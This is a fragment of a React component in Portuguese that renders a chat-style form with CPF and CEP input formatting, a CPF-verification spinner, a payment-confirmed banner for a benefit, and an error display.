          </div>
        ))}

        {/* Dica contextual */}
        {showTip && <ContextualTip tip={currentTip} />}

        {/* Celebração */}
        {showCelebration && <Celebration />}

        {/* Indicador de verificação CPF */}
        {cpfVerificationLoading && (
          <div className="flex items-center justify-center my-4 p-4 bg-blue-100 border-2 border-blue-300 rounded-lg text-blue-800">
            <div className="flex flex-col items-center">
              <div className="animate-spin h-8 w-8 border-4 border-blue-600 border-t-transparent rounded-full mb-2" />
              <span className="font-bold text-lg">Verificando CPF...</span>
              <span className="text-sm">Consultando base de dados oficial</span>
            </div>
          </div>
        )}

        {/* Indicador de pagamento confirmado - MELHORADO */}
        {paymentConfirmed && (
          <div className="flex items-center justify-center my-4 p-4 bg-green-100 border-2 border-green-300 rounded-lg text-green-800 animate-pulse">
            <div className="flex flex-col items-center">
              <Check className="h-8 w-8 text-green-600 mb-2" />
              <span className="font-bold text-lg">Pagamento Confirmado!</span>
              <span className="text-sm">Benefício será ativado em breve</span>
            </div>
          </div>
        )}

        <div ref={messagesEndRef} />
      </div>

      {/* Input */}
      <form onSubmit={handleSubmit} className="bg-gray-200 p-3 flex items-center">
        <Input
          type="text"
          value={currentInput}
          onChange={(e) => {
            const value = e.target.value
            const lastMessage = messages[messages.length - 1]
            if (lastMessage?.input?.field === "cep") {
              setCurrentInput(formatCEP(value))
            } else if (lastMessage?.input?.field === "cpf") {
              setCurrentInput(formatCPF(value))
            } else {
              setCurrentInput(value)
            }
          }}
          placeholder={
            waitingForInput
              ? messages[messages.length - 1]?.input?.placeholder || "Digite sua mensagem..."
              : "Aguarde..."
          }
          disabled={!waitingForInput || loading || cpfVerificationLoading}
          className="flex-1 rounded-full border-0"
        />
        <Button
          type="submit"
          disabled={!waitingForInput || !currentInput.trim() || loading || cpfVerificationLoading}
          className="ml-2 rounded-full w-10 h-10 p-0 bg-blue-900 hover:bg-blue-800"
        >
          {loading || cpfVerificationLoading ? (
            <div className="animate-spin h-4 w-4 border-2 border-white border-t-transparent rounded-full" />
          ) : (
            <Send size={18} />
          )}
        </Button>
      </form>

      {/* Erro CEP */}
      {cepError && <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-2 text-sm">{cepError}</div>}
    </div>
  )
}
